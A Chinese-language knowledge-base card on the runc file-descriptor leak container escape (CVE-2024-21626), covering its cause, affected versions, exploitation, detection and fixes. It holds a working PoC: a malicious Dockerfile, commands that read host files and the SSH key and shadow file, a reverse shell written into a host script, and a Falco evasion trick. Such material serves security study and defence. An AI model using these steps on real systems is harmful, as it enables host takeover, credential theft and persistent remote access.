---
id: cloud-container-runc-fd-leak-escape
title: runc 文件描述符泄漏容器逃逸：/proc/self/fd/8 读写宿主机与覆盖二进制（CVE-2024-21626）
type: scenario
domain: cloud
path: cloud/container
technique: runc-fd-leak-container-escape
tags:
- docker
- runc
- container-escape
- fd-leak
- cve-2024-21626
- proc-self-fd
- cri-o
- kubernetes
cve:
- CVE-2024-21626
severity: critical
confidence: high
status: verified
affected_versions: runc v1.0.0-rc93 ～ v1.1.11（含），修复于 v1.1.12；Docker 24.0.x 及以下，部分 25.x 取决于其打包的 runc 版本
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V114
  verified_at: '2026-11-06T01:50:30+08:00'
  notes: 已通读 content_text.md（470行，content.md 仅多7张内嵌base64图）并逐张核对7张截图。卡片的 runc v1.0.0-rc93～v1.1.11、Docker 24.0.x/部分25.x、CVSS 8.6、CWE-403/668、fd 常见为8但可能7/9需枚举、WORKDIR /proc/self/fd/8（Attack1）、docker exec+cd /proc/self/fd/8/../..（Attack2）、docker build RUN 覆盖（Attack3a）、逃逸后覆盖可写脚本回弹（Attack3b）、O_CLOEXEC/CloseExecFrom 修复、user namespace 映射导致读 /root 失败的限制、SELinux/AppArmor 约束有限、Falco 规则与多次 cd 绕过均与原文一致。affected_versions 已按原文区间设置。原文为模拟环境复现、未在本机复跑。
url: /docs/cloud/container/cloud-container-runc-fd-leak-escape/
draft: false
kb_aliases:
- CVE-2024-21626
- runc fd 泄漏
- Leaky Vessels
- /proc/self/fd/8
- WORKDIR /proc/self/fd/8
- runc 文件描述符泄漏逃逸
---

## 一句话结论

用受影响的 runc（v1.0.0-rc93～v1.1.11）创建或进入的容器，runc 在切换 rootfs 前打开的宿主机根目录 fd（常见为 8）没有被关闭或标记 `O_CLOEXEC`，残留在容器进程的 fd 表中；容器内进程通过 `/proc/self/fd/8/...` 即可直接读写宿主机文件系统，配合恶意镜像的 `WORKDIR`、`docker exec`、`docker build` 中的 `RUN` 或覆盖宿主机可写脚本，可进一步实现宿主机命令执行。

## 原理

- runc 是 Docker、containerd、CRI-O、Podman 等运行时底层的 OCI 运行时。创建容器时它要解析 OCI bundle、创建 namespace、设置 cgroups、准备挂载，再用 `pivot_root`/`chroot` 切换到容器 rootfs，最后 `execve` 容器进程。
- 在切换 rootfs 之前，runc 会打开宿主机的根目录 fd 用于处理挂载等操作。正常情况下该 fd 必须在 `execve` 前关闭，或至少标记 `O_CLOEXEC`；受影响版本遗漏了这一步。
- `pivot_root` 只改变进程的挂载命名空间根，不会使已经打开的文件描述符失效。fd 仍引用宿主机的根 mount/dentry，因此对它的 `openat`、`chdir` 等操作都相对于宿主机根目录解析。
- Linux 的 `/proc/<pid>/fd/<n>` 是 magic link。容器进程即使看不到宿主机根路径，也能通过 `/proc/self/fd/8/` 访问该 fd 指向的宿主目录；`/proc/self/fd/8/../../`、`/proc/self/fd/8/etc/passwd` 等路径都会落到宿主机文件系统。
- `WORKDIR /proc/self/fd/8` 能触发逃逸，是因为 Docker 把它写入 OCI `process.cwd`，runc 启动容器时执行 `chdir` 跟随该 magic link，进程实际工作目录变成宿主机根目录，但 shell 的 `PWD` 字符串仍显示 `/proc/self/fd/8`。
- 根因属于 CWE-403（文件描述符暴露给非预期控制域）与 CWE-668（资源暴露给错误的控制域），不是内核漏洞；公开评级 CVSS 8.6。
- 泄漏 fd 的编号不固定：常见为 8，也可能因发行版、版本和启动路径不同而出现在 7、9 等位置，利用时应枚举 `/proc/self/fd/` 而不是只认 8。
- 修复提交的核心是两点：启动 `runc init` 前把非 stdio 的打开文件全部标记 `O_CLOEXEC`；在 `pivot_root` 之后、执行容器进程之前主动关闭不传给容器的 fd，并把 `cgroupFd` 从 `int` 改为 `*os.File` 以便正确管理生命周期。

## 触发条件

- runc 版本在 v1.0.0-rc93 至 v1.1.11 之间（含）；修复版本为 v1.1.12 及以上。
- Docker 24.0.x 及以下受影响；部分 25.x 是否受影响取决于其打包的 runc 版本。应使用 `docker info | grep -i runc` 确认 Docker 实际使用的运行时版本，`apt list --installed` 中系统 runc 的版本不能代表 Docker 内置运行时。
- 不需要 `--privileged`、`--pid=host`、`--network=host` 或额外 capability，默认配置容器即可触发。
- 攻击者需要满足其一：能进入已有容器执行命令（WebShell/RCE/未授权接口）；能诱导受害者 `docker run` 恶意镜像；能触发一次 `docker build`（如恶意 PR 触发 CI 构建）。
- 若要把“文件系统访问”升级为“宿主机 root 命令执行”，还需要宿主机上存在容器进程可写的文件/脚本，或容器挂载了可写的宿主机目录，或容器以 privileged 运行。

## 利用步骤

1. 确认运行时版本：`runc --version`；`docker info 2>/dev/null | grep -i runc`。低于 1.1.12 即受影响。
2. Attack 1（恶意镜像）：在 Dockerfile 中设置 `WORKDIR /proc/self/fd/8`，把镜像推到公共 Registry 或用 `docker compose` 投递；受害者 `docker run` 后容器工作目录即为宿主机根目录。
3. Attack 2（运行时逃逸）：进入已有容器（如 `docker exec -it <container> bash`），执行 `ls -la /proc/self/fd/` 找到指向 `/` 的泄漏 fd；用 `cd /proc/self/fd/8/../../` 或直接读写 `/proc/self/fd/8/<path>` 访问宿主机文件系统。
4. Attack 3a（构建阶段覆盖）：恶意 Dockerfile 的 `RUN` 指令在 `docker build` 期间同样能通过泄漏 fd 访问宿主机，可覆盖宿主机二进制或脚本；CI 自动构建恶意 PR 即可触发，无需运行容器。
5. Attack 3b（运行时覆盖）：逃逸到宿主机文件系统后，枚举可写文件（`find / -writable -type f 2>/dev/null` 或通过 fd 视角检索），选择 cron 脚本、systemd service、`/usr/local/bin` 健康检查脚本、`/tmp` 定期执行脚本等持久化目标，写入反向 shell，等待 cron/重启/健康检查触发。
6. 权限确认与后续利用：尝试读取 `/root/.ssh/id_rsa`、`/etc/shadow`；若容器启用 user namespace 映射，容器 root 在宿主机上是普通 uid，只能操作 others 可写文件，需要继续寻找可写脚本、setuid 二进制或 privileged 容器。

## PoC

```dockerfile
# 恶意镜像：容器启动时 cwd 落到宿主机根目录
FROM ubuntu:22.04
WORKDIR /proc/self/fd/8
CMD ["/bin/bash"]
```

```bash
# 构建并在受害者环境运行
docker build -t escape-demo .
docker run --rm -it escape-demo bash

# 容器内确认泄漏 fd；8 通常指向宿主机 /
ls -la /proc/self/fd/
ls -la /proc/self/fd/8/

# 访问宿主机文件系统
cat /proc/self/fd/8/etc/passwd
cd /proc/self/fd/8/../../
ls -la
```

```bash
# Attack 3b：逃逸后覆盖宿主机可写脚本并等待触发
find / -writable -type f 2>/dev/null | head -5
echo '#!/bin/bash' > /usr/local/bin/healthcheck.sh
echo 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' >> /usr/local/bin/healthcheck.sh
# 攻击者监听
nc -lvnp 4444
```

PoC 中的 IP、路径、脚本名按环境替换；覆盖目标应优先选宿主机自身脚本而非容器 volume 挂载文件，重启后仍能持久化。文章为模拟环境复现，未在本机执行。

## 变体与关联

- 变体 Attack 3a：`docker build` 的 `RUN` 阶段即可覆盖宿主机文件，攻击面在 CI/CD，不要求攻击者拥有宿主机账户，只需能触发一次构建。
- 变体 Attack 3b：从已逃逸的 shell 覆盖宿主机二进制/脚本，获得宿主机 root 命令执行；触发方式可为 cron、systemd、健康检查、SSRF 打到宿主机端口等。
- 变体 fd 编号：泄漏 fd 可能为 7、8、9 等；容器内枚举 `/proc/self/fd/`，寻找 `-> /` 的项。
- 关键限制：逃逸到宿主机文件系统不等于拿到宿主机 root。若启用 `--userns-remap` 或类似 user namespace 映射，容器内 uid 0 在宿主机上是映射后的普通 uid，读取 root 私钥、`/etc/shadow` 会失败；需借助可写文件、privileged 容器或 setuid 程序继续提权。
- LSM 限制：SELinux/AppArmor 的容器路径策略对 runc 预先打开的宿主 fd 约束有限，不能把 LSM 当作该漏洞的可靠缓解；仍需以升级 runc 为主。
- 检测绕过：Falco 若只匹配单条命令行中的 `/proc/self/fd/` 与 `../../`，攻击者可用多次 `cd`（先 `cd /proc/self/fd/8/`，再 `cd ../../root`）拆分特征；更可靠的是 eBPF 监控进程工作目录越过容器根边界的 `chdir` 事件。
- 关联卡片：[[cloud-container-docker-privileged-host-disk-escape]]（特权容器挂载宿主机磁盘）、[[cloud-container-docker-socket-tcp-escape]]（Docker Socket/TCP 暴露）、[[cloud-container-docker-procfs-core-pattern-escape]]（procfs core_pattern）、[[cloud-container-k8s-workload-config-escape]]（K8s 危险工作负载配置）、[[cloud-container-docker-cp-symlink-toctou-escape]]（docker cp 符号链接 TOCTOU）。
- 同类后续问题：runc 的 `/dev` 符号链接处理也曾被披露可破坏宿主机文件系统完整性（GHSA-xjvp-4fhw-gc47），根因与 fd 泄漏不同，本卡不展开。

## 检测与防御

- 根本修复：升级 runc 到 1.1.12 及以上；同时确认 Docker/containerd/CRI-O 实际调用的 runc 已更新（`docker info | grep -i runc`），仅升级系统包可能不生效。Docker 环境可升级 Docker 本身或替换运行时二进制。
- 临时缓解：用 seccomp 过滤 `openat`/`chdir` 对 `/proc/self/fd/` 前缀的访问；容器使用只读 rootfs；drop 全部非必要 capability，至少移除 `CAP_SYS_PTRACE`、`CAP_DAC_READ_SEARCH`；禁止 privileged；启用 user namespace 映射降低影响。这些只能降低写入和提权能力，不能替代升级。
- K8s 加固：采用 Restricted Pod Security Standard，禁止 privileged、hostPath、hostPID、hostNetwork，`allowPrivilegeEscalation: false`，`readOnlyRootFilesystem: true`，`runAsNonRoot`，drop ALL capabilities，seccomp `RuntimeDefault`。
- 运行时检测（Falco 示例）：匹配容器进程命令行同时包含 `/proc/self/fd/` 与 `../../`，优先级 CRITICAL；需注意多次 `cd` 可绕过。
- 更完整检测：eBPF 监控 `chdir`/路径解析是否越过容器根文件系统边界；宿主机关键目录（`/usr/bin`、`/usr/local/bin`、`/etc/cron.d`、systemd unit）做 AIDE/Tripwire 完整性监控；监控容器网络中的异常反向 shell 与非常规出站连接。
- 镜像与供应链：不运行来源不可信镜像，固定镜像 digest，CI 中禁止不可信 PR 自动执行 `docker build`，限制构建节点权限；对 Registry 做镜像签名/扫描。
- 响应：发现容器内访问 `/proc/self/fd/` 或宿主机文件被改写时，隔离容器与构建节点，检查宿主机 cron/systemd/SSH authorized_keys 与二进制完整性，轮换凭据并修复运行时。
